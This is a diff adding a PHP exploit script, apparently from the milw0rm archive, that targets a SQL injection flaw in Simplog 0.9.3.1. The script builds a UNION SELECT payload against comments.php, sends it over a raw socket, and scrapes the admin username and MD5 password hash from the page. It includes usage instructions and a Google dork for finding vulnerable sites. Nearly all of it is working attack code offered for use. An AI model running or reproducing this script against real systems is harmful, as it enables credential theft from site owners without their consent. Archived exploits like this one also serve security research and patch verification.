@@ -1,0 +1,76 @@
+#!/usr/bin/php
+<?php
+ /*********************************************************************
+ * Simplog 0.9.3.1 Remote SQL Injection Vulnerability 
+ * 
+ * Note:
+ * Requires at least one blog entry to be made prior to injection
+ *
+ * Usage: 
+ * php script.php [host] [path] [user id]
+ *
+ * Usage Example:
+ * php script.php domain.com /simplog/ 1
+ *
+ * Googledork:
+ * intext:Powered by Simplog
+ *
+ * Credits:
+ * Disfigure - Vulnerability research and discovery
+ * Synsta - Exploit scripting
+ * 
+ * [w4ck1ng] - w4ck1ng.com
+ *********************************************************************/
+
+if(!$argv[3 ]){
+die("Usage:
+php $argv[0] [host] [path] [user id]\n
+Usage Example:
+php $argv[0] domain.com /simplog/ 1\n");
+}
+
+if($argv[3]){
+
+function send($host, $put){
+global $data;
+$conn = fsockopen( gethostbyname($host),"80" );
+if(!$conn) {
+die("Connection to $host failed...");
+}else{
+fputs($conn, $put);
+}
+while(!feof($conn)) {
+$data .=fgets( $conn);
+}
+fclose($conn);
+return $data;
+}
+
+$host = $argv[ 1];
+$path = $argv[ 2];
+$userid = $argv[ 3];
+
+$sql = urlencode( "-1 union select 9,9,9,login,9,password,9,9 from blog_users where admin=$userid");
+$req =  "GET ". $path."comments.php?op=edit&cid=". "$sql HTTP/1.1\r\n";
+$req .= "Host: $host\r\n";
+//$req .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$req .= "Content-Type: text/plain\r\n" ;
+$req .= "Connection: Close\r\n\r\n" ;
+send("$host", "$req");
+
+$aname = explode( "><input type=text name=cname maxlength=64 value=\"",$data);
+$bname = explode( "\">",$aname[1 ]);
+$name = $bname[ 0];
+$ahash = explode( "<textarea name=comment rows=10 cols=40 wrap=physical>",$data);
+$bhash = explode( "</textarea>",$ahash[1 ]);
+$hash = $bhash[ 0];
+
+if(strlen($hash) !=  32){ 
+die("Exploit failed..\n"); 
+}else{ 
+die("Username: $name MD5: $hash\n"); 
+}
+}
+?>
+
+# milw0rm.com [2006-10-16]
